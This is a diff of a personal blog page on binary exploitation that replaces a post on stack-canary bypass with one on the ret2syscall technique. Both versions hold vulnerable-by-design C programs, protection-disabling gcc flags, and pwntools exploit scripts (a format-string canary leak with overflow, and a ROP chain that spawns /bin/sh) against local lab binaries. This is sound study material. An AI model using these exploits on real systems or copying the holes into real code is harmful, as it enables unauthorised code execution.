@@ -9,7 +9,7 @@
     
     <title>
         
-            Canary保护机制及绕过 |
+            ret2syscall |
         
         Jerem1ah&#39;s Blog
     </title>
@@ -162,7 +162,7 @@
         <div class="article-content-container">
 
             <div class="article-title">
-                <span class="title-hover-animation">Canary保护机制及绕过</span>
+                <span class="title-hover-animation">ret2syscall</span>
             </div>
 
             
@@ -184,8 +184,8 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2024-08-05 20:47:10</span>
-        <span class="mobile">2024-08-05 20:47</span>
+        <span class="pc">2024-08-13 09:46:43</span>
+        <span class="mobile">2024-08-13 09:46</span>
     </span>
     
         <span class="article-update-date article-meta-item">
@@ -219,51 +219,41 @@
             
 
             <div class="article-content keep-markdown-body">
-                <h1 id="Canary保护机制及绕过"><a href="#Canary保护机制及绕过" class="headerlink" title="Canary保护机制及绕过"></a>Canary保护机制及绕过</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/129188665?spm=1001.2014.3001.5502" >https://blog.csdn.net/m0_64815693/article/details/129188665?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/346608.html" >https://www.freebuf.com/articles/system/346608.html<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">    printf(str);</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                <h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Junglezt/p/18225810" >https://www.cnblogs.com/Junglezt/p/18225810<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;64</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://uuzdaisuki.com/2020/02/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/" >https://uuzdaisuki.com/2020/02/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/<i class="fas fa-external-link-alt"></i></a>  &#x2F;&#x2F;32</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zoepla.github.io/2018/04/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87/" >https://zoepla.github.io/2018/04/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/XDSEC/MoeCTF_2023/blob/c8cbc0a8b8a63994520d15db03788996ad891ce3/Challenges/Pwn/ret2syscall/ret2syscall.c" >https://github.com/XDSEC/MoeCTF_2023/blob/c8cbc0a8b8a63994520d15db03788996ad891ce3/Challenges/Pwn/ret2syscall/ret2syscall.c<i class="fas fa-external-link-alt"></i></a>  &#x2F;&#x2F;ret2syscall.c</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/ret2syscall.html" >https://wiki.wgpsec.org/knowledge/ctf/ret2syscall.html<i class="fas fa-external-link-alt"></i></a> </p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://syscalls32.paolostivanin.com/" >https://syscalls32.paolostivanin.com/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html" >https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *shell = &quot;/bin/sh&quot;;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">    setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">    </span><br><span class="line">    char buf[100];</span><br><span class="line"></span><br><span class="line">    printf(&quot;This time, no system() and NO SHELLCODE!!!\n&quot;);</span><br><span class="line">    printf(&quot;What do you plan to do?\n&quot;);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -no-pie -z norelro -fstack-protector-all 03.c -o 3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -no-pie -z norelro -o test test.c</span><br></pre></td></tr></table></figure>
 
-<ol>
-<li><p>相较于之前没开保护，现在增加了一些指令，如下，主要就是将一个随机数赋值给rax寄存器，然后再将rax寄存器的值压入栈中，之后进行一个xor操作，简而言之，就是在栈中加入了一个随机<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240730095420945.png" alt="image-20240730095420945"></p>
-</li>
-<li><p>随机数存放的位置如图，在（rbp，rbp-8】的位置<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802133941258.png" alt="image-20240802133941258"></p>
-</li>
-<li><p>main函数的栈帧改变之前，【随机数，地址，下条指令地址，rbp值】<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802134843418.png" alt="image-20240802134843418"></p>
-</li>
-<li><pre><code class="py">from pwn import *
-context.log_level = &quot;debug&quot;
-context.terminal = [&#39;bash&#39;, &#39;-e&#39;, &#39;sh&#39;, &#39;-c&#39;]
-p = gdb.debug(&quot;/home/pwn/03eeepwn/test&quot;,&quot;break main&quot;)
+<p><img src="/../images/53%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall/image-20240806093352939.png" alt="image-20240806093352939"></p>
+<p>32位binary下的shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax:0xb</span><br><span class="line">ebx:bin_sh_addr</span><br><span class="line">ecx:0</span><br><span class="line">edx:0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>64位binary下的shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rax:59</span><br><span class="line">rdi:bin_sh_addr</span><br><span class="line">rsi:0</span><br><span class="line">rdx:0</span><br><span class="line">rcx:0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
 
-a = input(&quot;a:&quot;)
-p.sendline(b&quot;%11$p&quot;)
 
-b = input(&quot;b:&quot;)
-cannary = p.recvline(keepends = False)
-cannary = p.recvline(keepends = False)
 
-cannary = int(cannary.decode().strip(), 16)
-print(cannary)
 
-c = input(&quot;c:&quot;)
+<p>上面的代码找不到寄存器地址，用下面的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">char binsh[] = &quot;/bin/sh&quot;;</span><br><span class="line"></span><br><span class="line">void gadget() &#123;</span><br><span class="line">    asm volatile(</span><br><span class="line">    	&quot;pop %rax;&quot;</span><br><span class="line">    	&quot;ret;&quot;</span><br><span class="line">        &quot;pop %rdi;&quot;</span><br><span class="line">        &quot;ret;&quot;</span><br><span class="line">        &quot;pop %rsi;&quot;</span><br><span class="line">        &quot;pop %rdx;&quot;</span><br><span class="line">        &quot;ret;&quot;</span><br><span class="line">        &quot;syscall&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Can you make a syscall?\n&quot;);</span><br><span class="line">    char buf[60];</span><br><span class="line">    read(0, buf, 0x100);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void unbuffer() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// gcc ret2syscall.c -fno-stack-protector -no-pie -o ret2syscall</span><br></pre></td></tr></table></figure>
 
-offset1 = 0x30 - 0x08
-offset2 = 0x08
-payload = b&#39;a&#39;*offset1 + p64(cannary) + b&#39;b&#39;*offset2 + p64(0x4011d8)+p64(0x401196)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-</li>
-<li><p>不废话了，直接分析，主要就是通过格式化字符串拿到cannary的值，然后直接栈溢出就ok了，以下是拿到cannary的值之后在栈中注入恶意字符的栈帧<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222132245.png" alt="image-20240802222132245"></p>
-</li>
-<li><p><img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222218970.png" alt="image-20240802222218970"></p>
-</li>
-<li><p>获得权限<img src="/../images/50%E9%87%91%E4%B8%9D%E9%9B%80%E7%BB%95%E8%BF%87/image-20240802222414964.png" alt="image-20240802222414964"></p>
-</li>
-</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -fno-stack-protector -no-pie -o test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/53%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall/image-20240807123135624.png" alt="image-20240807123135624"></p>
+<p><img src="/../images/53%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall/image-20240807123659730.png" alt="image-20240807123659730"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_ret_addr = 0x000000000040117e</span><br><span class="line">pop_rdi_ret_addr = 0x0000000000401180</span><br><span class="line">pop_rsi_rdx_ret_addr = 0x0000000000401182</span><br><span class="line">syscall_addr = 0x0000000000401185</span><br><span class="line">binsh_addr = 0x0000000000404040</span><br><span class="line">offset = 0x40 + 0x08</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p64(pop_rax_ret_addr) + p64(59) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(syscall_addr)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&quot;bash&quot;]</span><br><span class="line"></span><br><span class="line">p = process(&quot;/home/pwn/07ret2syscall/test&quot;)</span><br><span class="line"></span><br><span class="line">pop_rax_ret_addr = 0x000000000040117e</span><br><span class="line">pop_rdi_ret_addr = 0x0000000000401180</span><br><span class="line">pop_rsi_rdx_ret_addr = 0x0000000000401182</span><br><span class="line">syscall_addr = 0x0000000000401185</span><br><span class="line">binsh_addr = 0x0000000000404040</span><br><span class="line">offset = 0x40 + 0x08</span><br><span class="line">payload = cyclic(offset)</span><br><span class="line">payload += p64(pop_rax_ret_addr) + p64(59) </span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(binsh_addr) </span><br><span class="line">payload += p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/53%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall/image-20240807124859576.png" alt="image-20240807124859576"></p>
+<p>还是比较容易理解的。不过rcx好像没用到。</p>
 
             </div>
 
@@ -285,13 +275,13 @@ p.interactive()
                         <div class="article-prev">
                             <a class="prev"
                                rel="prev"
-                               href="/2024/08/05/51%E6%A0%88%E6%BA%A2%E5%87%BAret2text/"
+                               href="/2024/08/13/54%E6%A0%88%E6%BA%A2%E5%87%BAret2libc/"
                             >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                                 <span class="title flex-center">
-                                <span class="post-nav-title-item">ret2text</span>
+                                <span class="post-nav-title-item">CISCN 2019东北-PWN2</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                             </a>
@@ -301,10 +291,10 @@ p.interactive()
                         <div class="article-next">
                             <a class="next"
                                rel="next"
-                               href="/2024/08/05/49%E6%A0%88%E6%BA%A2%E5%87%BA/"
+                               href="/2024/08/05/52%E6%A0%88%E6%BA%A2%E5%87%BAret2shellcode/"
                             >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">栈溢出分析</span>
+                                <span class="post-nav-title-item">ret2shellcode</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                                 <span class="right arrow-icon flex-center">
@@ -381,7 +371,7 @@ p.interactive()
             <div class="toc-content-container">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="nav-text">Canary保护机制及绕过</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a></li></ol>
     </div>
 </div>
 
